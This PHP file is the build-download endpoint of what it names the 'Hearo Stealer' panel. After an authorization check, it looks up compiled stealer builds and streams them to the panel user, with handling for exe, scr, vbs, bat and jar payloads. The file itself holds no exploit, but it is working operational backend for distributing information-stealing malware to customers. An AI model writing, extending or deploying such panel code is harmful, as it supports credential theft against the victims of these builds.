<?php
// Hearo Stealer — Build Download Endpoint
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

$buildId = (int)($_GET['id'] ?? 0);
if (!$buildId) die('No build ID.');

$stmt = $db->prepare("SELECT * FROM build_configs WHERE id = ?");
$stmt->execute([$buildId]);
$build = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$build) die('Build not found.');
if (!isAdmin() && $build['user_id'] !== $_SESSION['user_id']) die('Unauthorized.');

$filePath = $build['compiled_path'];
if (!$filePath || !file_exists($filePath)) die('Build file missing on disk.');

// Increment download count
$db->prepare("UPDATE build_configs SET download_count = download_count + 1 WHERE id = ?")->execute([$buildId]);

$mime = 'application/octet-stream';
$ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
if ($ext === 'zip') $mime = 'application/zip';
if ($ext === 'jar') $mime = 'application/java-archive';
if ($ext === 'vbs') $mime = 'application/octet-stream';
if ($ext === 'bat') $mime = 'application/octet-stream';
if ($ext === 'exe') $mime = 'application/octet-stream';
if ($ext === 'scr') $mime = 'application/octet-stream';

// Use the stored output_filename as the download name (clean name, no build tag prefix)
$downloadName = $build['output_filename'] ?: basename($filePath);

header('Content-Type: ' . $mime);
header('Content-Disposition: attachment; filename="' . $downloadName . '"');
header('Content-Length: ' . filesize($filePath));

// Disable output buffering and send headers
if (ob_get_level()) ob_end_clean();
flush();

// Read file in chunks to prevent memory exhaustion for 80MB+ payloads
$handle = fopen($filePath, 'rb');
if ($handle !== false) {
    while (!feof($handle)) {
        echo fread($handle, 1024 * 1024);
        flush();
    }
    fclose($handle);
}
exit;
